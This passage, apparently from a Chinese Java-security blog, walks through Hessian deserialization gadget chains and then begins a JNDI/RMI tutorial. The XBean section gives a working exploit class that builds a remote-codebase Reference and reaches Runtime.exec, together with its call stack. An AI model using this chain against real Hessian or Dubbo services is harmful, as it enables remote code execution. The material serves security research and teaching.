<span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关键点</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="comment">// ....</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这条链就是需要远程加载恶意类，根据代码，需要让refInfo为Reference实例，同时ref.getFactoryClassName()不为空，至于设置成分什么，继续观察后面方法，来到getObjectFactoryFromReference方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">InstantiationException,</span><br><span class="line">MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">        (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过代码库加载工厂类</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 实例化类</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先观察这里的helper.loadClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">VersionHelper</span> <span class="variable">helper</span> <span class="operator">=</span> VersionHelper.getVersionHelper();</span><br></pre></td></tr></table></figure>

<p>这里的helper是一个VersionHelper12对象，查看loadClass方法，其加载时使用了URLClassLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">        URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以通过远程代码库加载类，因此这里的factoryName可以设置为恶意类名，codebase设置为远程代码库地址</p>
<p>重新梳理一下：</p>
<p>前面提到，refInfo要为Reference类，根据getResolvedObj看cpe如何构造</p>
<p>CannotProceedException继承NamingException，调用父类的getResolvedObj方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getResolvedObj</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> resolvedObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此在构造CannotProceedException对象时，需要将resolvedObj属性设置成构造的Reference对象</p>
<p>那么Reference如何构造，需要的点数据流如下：</p>
<ul>
<li><p>cpe.getResolvedObj()——&gt;refInfo——&gt;ref——&gt;ref.getFactoryClassName()——&gt;f——&gt;factoryName</p>
<p>查看Reference的getFactoryClassName()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getFactoryClassName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> classFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此设置classFactory属性为恶意类名</p>
</li>
<li><p>cpe.getResolvedObj()——&gt;refInfo——&gt;ref.getFactoryClassLocation()——&gt;codebase</p>
<p>查看Reference的getFactoryClassLocation方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> classFactoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置classFactoryLocation属性为恶意的URL</p>
</li>
<li><p>综上，选择合适的Reference的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选择这个即可</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240204231605.png"></p>
<p>最终实例化后导致命令执行</p>
<h2 id="XBean链"><a href="#XBean链" class="headerlink" title="XBean链"></a>XBean链</h2><p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NamingManager.getObjectFactoryFromReference() (javax.naming.spi)</span><br><span class="line">NamingManager.getObjectInstance() (javax.naming.spi)</span><br><span class="line">ContextUtil.resolve()   (org.apache.xbean.naming.context)<span class="comment">// 关键点</span></span><br><span class="line">ContextUtil$ReadOnlyBinding.getObject() (org.apache.xbean.naming.context)<span class="comment">// 关键点</span></span><br><span class="line">Binding.toString() (com.caucho.naming)     <span class="comment">// 关键点</span></span><br><span class="line">XString.equals() (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">HotSwappableTargetSource.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dili.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XbeanHessian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refAddr</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName, refClassName, refAddr);</span><br><span class="line">        <span class="type">WritableContext</span> <span class="variable">writableContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WritableContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ReadOnlyBinding对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">readOnlyBinding</span> <span class="operator">=</span> Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class).newInstance(<span class="string">&quot;aaa&quot;</span>, ref, writableContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建XString</span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(readOnlyBinding);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(targetSource1, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        hashMap.put(targetSource2, <span class="string">&quot;222&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JavaSec/out/XbeanHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(hashMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JavaSec/out/XbeanHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="函数调用栈-4"><a href="#函数调用栈-4" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;init&gt;:<span class="number">6</span>, test</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">resolve:<span class="number">73</span>, ContextUtil (org.apache.xbean.naming.context)</span><br><span class="line">getObject:<span class="number">204</span>, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">toString:<span class="number">192</span>, Binding (javax.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">58</span>, XbeanHessian (org.dili.hessian)</span><br></pre></td></tr></table></figure>

<h3 id="详细分析-4"><a href="#详细分析-4" class="headerlink" title="详细分析"></a>详细分析</h3><p><strong>第一步</strong></p>
<p>Hessian中readObject流程依旧没有变，触发点为MapDeserializer.readMap方法的第二次循环</p>
<p><strong>第二步</strong></p>
<p>进入第二个HotSwappableTargetSource对象的equals方法，调用第二个对象target属性的equals方法，传入的参数为第一个对象的target属性</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240205163516.png"></p>
<p><strong>第三步</strong></p>
<p>在XString的equals方法中，会调用参数的toString方法，根据链子，这里将其设置为ContextUtil$ReadOnlyBinding对象，它继承了Binding类，因此会调用父类的toString方法，进入该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.toString() + <span class="string">&quot;:&quot;</span> + getObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用该对象的getObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="keyword">return</span> ContextUtil.resolve(<span class="built_in">this</span>.value, <span class="built_in">this</span>.getName(), (Name)<span class="literal">null</span>, <span class="built_in">this</span>.context);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要利用ContextUtil的resolve方法，查看该方法，观察传入的参数应该是什么？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">resolve</span><span class="params">(Object value, String stringName, Name parsedName, Context nameCtx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> (Reference)value;</span><br><span class="line">        <span class="keyword">if</span> (reference <span class="keyword">instanceof</span> SimpleReference) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ((SimpleReference)reference).getContent();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)(<span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not look up : &quot;</span> + stringName == <span class="literal">null</span> ? parsedName.toString() : stringName)).initCause(var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parsedName == <span class="literal">null</span>) &#123;</span><br><span class="line">                    parsedName = NAME_PARSER.parse(stringName);</span><br><span class="line">                &#125;</span><br><span class="line">				</span><br><span class="line">                <span class="comment">// 关键点</span></span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(reference, parsedName, nameCtx, nameCtx.getEnvironment());</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法调用了NamingManager.getObjectInstance方法，这和Resin链后半部分是一样的，因此这里也是加载远程的恶意类导致RCE。根据上一条链，这里传入的reference即是构造的包含恶意URL的实例化Reference对象，它是通过value参数传入进来的</p>
<p>回到ContextUtil$ReadOnlyBinding对象的构造，需要将value属性设置为构造的Reference对象，同时context属性需要是Context子类的实例化对象，因为在resolve方法中传入的参数就是Context对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240205171405.png"></p>
<p>后面的链不再重复，和Resin后半部分一样</p>
<h3 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h3><p>这里套用了一层HotSwappableTargetSource后，目的是为了绕过HashMap中putVal方法中到达equals方法前的两个条件，其实Resin链也可以这么做。</p>
<p>如果不借用HotSwappableTargetSource，通过hash逆求解得到Xtring后，在exp中的HashMap的put操作时能够满足条件，导致RCE，但是在反序列化的时候无法触发执行，并且调试后发现p.hash&#x3D;&#x3D;hash过不了，原因未知</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文详细描述了Hessian链的相关利用及exp构造的每一步解释，代码：<a href="https://github.com/DiliLearngent/Java-Sec">Java-Sec</a></p>
<p>Dubbo是一个开源的高性能、轻量级的分布式服务框架，最初由阿里巴巴集团开发并开源。它旨在提供可靠的远程服务调用和服务治理的解决方案，支持高性能和低延迟的分布式服务调用。Dubbo 支持多种网络通信协议，包括 RPC（默认）、HTTP 和 Hessian。这使得 Dubbo 可以适应不同的应用场景和技术栈。针对Hessian协议，Dubbo历史版本存在漏洞，下一步将对这些历史漏洞进行详细分析，了解Hessian的实际应用产生的漏洞。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://hessian.caucho.com/">Hessian Binary Web Service Protocol (caucho.com)</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/15692979.html">Java安全之Dubbo反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://su18.org/post/hessian/">Hessian 反序列化知一二 | 素十八 (su18.org)</a></p>
<p><a href="https://goodapple.top/archives/1193">Java安全学习——Hessian反序列化漏洞 - 枫のBlog (goodapple.top)</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13599">https://xz.aliyun.com/t/13599</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之JNDI分析与利用</title>
    <url>/2023/04/19/JNDI/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方文档解释:</p>
<blockquote>
<p>The Java Naming and Directory Interface™ (JNDI) is an application programming interface (API) that provides naming and directory functionality to applications written using the Java™ programming language. It is defined to be independent of any specific directory service implementation. Thus a variety of directories -new, emerging, and already deployed can be accessed in a common way.</p>
<p><strong>JNDI</strong>即(Java Naming and Directory Interface)，包括Naming Service和Directory Service。<br>重点在于<code>Interface</code>这个词，表示JNDI是Java的API，允许客户端通过名称发现和查找数据、对象。</p>
</blockquote>
<p><strong>架构</strong>图如下，包括API和服务提供商接口(SPI)：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716143045.png"></p>
<p><strong>服务</strong><br>JNDI包含在Java SE平台中，需要使用JNDI的条件是:包含JNDI类和服务提供者。JDK中包含以下Naming&#x2F;Directory服务:</p>
<ul>
<li>轻量级目录访问协议(LDAP)</li>
<li>通用对象请求代理体系结构(CORBA) 通用对象服务(COS)</li>
<li>Java远程方法调用(RMI)</li>
<li>域名服务(DNS)</li>
</ul>
<p>在JDK中提供了5个包用于实现JNDI功能:</p>
<ul>
<li>javax.naming</li>
<li>javax.naming.directory</li>
<li>javax.naming.ldap</li>
<li>javax.naming.event</li>
<li>javax.naming.spi</li>
</ul>
<p><strong>注意</strong></p>
<ol>
<li>Naming Service与Directory Service的区别在于:目录服务中对象可以有属性，命名服务中对象没有属性</li>
</ol>
<p><strong>参考</strong><br><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">https://docs.oracle.com/javase/tutorial/jndi/overview/index.html</a></p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h2><p><strong>构造方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建一个初始的上下文</span></span><br><span class="line">InitialContext()</span><br><span class="line"><span class="comment">// 构建一个上下文，并选择是否初始它</span></span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy)</span><br><span class="line"><span class="comment">// 使用提供的环境构建初始上下文</span></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment)</span><br></pre></td></tr></table></figure>

<p><strong>常用方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">list(String name) </span><br><span class="line">lookup(String name) </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">unbind(String name)</span><br></pre></td></tr></table></figure>

<p>其他详情可参考:<a href="https://docs.oracle.com/javase/8/docs/api/javax/naming/InitialContext.html">https://docs.oracle.com/javase/8/docs/api/javax/naming/InitialContext.html</a></p>
<p><strong>JNDI+RMI服务示例</strong><br>先定义一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// 远程调用的类需要满足的条件</span></span><br><span class="line">    <span class="comment">// 继承Remote、Serializable</span></span><br><span class="line">    <span class="comment">// 方法为public</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端:在RMI注册表上注册远程对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, NamingException&#123;</span><br><span class="line">        <span class="comment">// 用于创建RMI注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">// 实例化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;mike&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="comment">// 将person对象绑定到JNDI服务中</span></span><br><span class="line">        initialContext.bind(<span class="string">&quot;person&quot;</span>, person);</span><br><span class="line">        initialContext.close();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    